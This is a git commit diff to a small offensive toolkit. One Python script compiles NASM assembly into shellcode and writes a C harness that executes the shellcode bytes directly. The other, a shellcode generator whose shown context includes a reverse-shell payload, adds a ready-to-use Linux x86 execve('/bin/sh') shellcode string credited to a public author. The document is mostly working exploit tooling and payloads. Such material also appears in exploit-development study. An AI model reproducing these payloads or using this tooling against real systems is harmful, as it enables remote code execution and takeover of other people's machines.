9f0e95f98cb83444573228476f154b56ace331b9
honeyjonny <honeyjonny@gmail.com>
2013-04-27 21:58:08 -0700

    updated, some bugs remvd

--- utils/bytecode.py
+++ utils/bytecode.py
@@ -3,10 +3,13 @@
 import sys, os, time
 
 def usage():
-    print """Usage: bytecode.py nasm_src_file
+    print """Usage: bytecode.py nasm_src_file [nrb] [ngc]
 
                     hj's utilite to fast compile
                     opcodes using nasm assembler
+
+                    nrb - not remove compiled binary file
+                    ngc - not generate c-proof source code
 
                     ********!!!!!!!!!!!!!********
 
@@ -17,19 +20,21 @@ def usage():
 
 def shelltest(opcodes):
     ccode = """
-/*shellcodetest.c*/ 
+/*shellcodetest.c*/
+#include <string.h>
 char code[] = "{}";\n""".format(opcodes)
     ccode += """int main(int argc, char **argv)
 {
-    int (*func)();
-    func = (int (*)()) code;
-    (int)(*func)();
+    (*(void  (*)()) code)();
 }
 """ 
     return ccode
     
-def to_bytecode(filename):
+def to_bytecode(filename, hdd):
     file = open(filename, 'rb').read()
+
+    if not hdd:
+        return file
 
     output = ''
     
@@ -39,13 +44,13 @@ def to_bytecode(filename):
 
     return output
 
-def nasm_compile(src):
+def nasm_compile(src, hdd):
     proc = os.popen('nasm -f bin -o {} {}'.format(src+'.bin', src)).read()
     if proc:
         print "Exception:\n" + proc
         sys.exit()
     time.sleep(3)
-    bytecode = to_bytecode(src+'.bin')
+    bytecode = to_bytecode(src+'.bin', hdd)
     return bytecode
 
 def bc(nasm_src, hdd=True, rembin=True, shctest=True):
@@ -66,14 +71,14 @@ def bc(nasm_src, hdd=True, rembin=True, shctest=True):
               to compile it and test shellcode work
 
     if you set hdd == 0 - func returned opcodes to you
-    opcodes = bc('shellcode.asm', hdd=0)
+    opcodes = bc('./shellcode.asm', hdd=0)
     """
 
     if not os.path.exists(nasm_src):
         print "This file: {} not exist!".format(nasm_src)
         return False
 
-    opcodes = nasm_compile(nasm_src)   
+    opcodes = nasm_compile(nasm_src, hdd)   
     if hdd:
         print >> open(nasm_src+'_bc.txt','wb'), opcodes
         if shctest:
@@ -109,4 +114,4 @@ if __name__ == '__main__':
     bc(sys.argv[1], rembin=rb, shctest=gc)
     sys.exit(0)
 
-#genn ex-patt class
+#EOF
--- utils/shellgen.py
+++ utils/shellgen.py
@@ -84,3 +84,17 @@ class linux(object):
         +"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
         return reverse_shell_remote
+
+    def bin_sh():
+        """
+        /*
+         * Super-small excve
+         *
+         * Title:    Linux x86 execve("/bin/sh") - 28 bytes
+         * Author:   Jean Pascal Pereira <pereira@secbiz.de>
+         * Web:	     http://0xffe4.org
+         *
+         */
+        """
+        bin_sh_shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+        return bin_sh_shellcode
